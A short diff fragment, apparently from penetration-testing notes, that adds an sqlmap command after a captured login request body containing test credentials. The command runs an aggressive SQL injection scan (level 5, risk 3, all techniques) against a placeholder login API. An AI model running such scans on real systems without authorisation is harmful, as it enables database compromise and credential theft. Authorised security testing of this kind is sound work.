@@ -41,4 +41,9 @@ Priority: u=1, i
 
 {"username":"miuser2","password":"12345","rememberMe":false}
 
+-----
+
+
+sqlmap -u "http://target.com/api/auth/login" --data '{"username":"admin","password":"123456"}' --headers="Content-Type: application/json"  --level=5 --risk=3 --technique=BEUST
+
 ----------
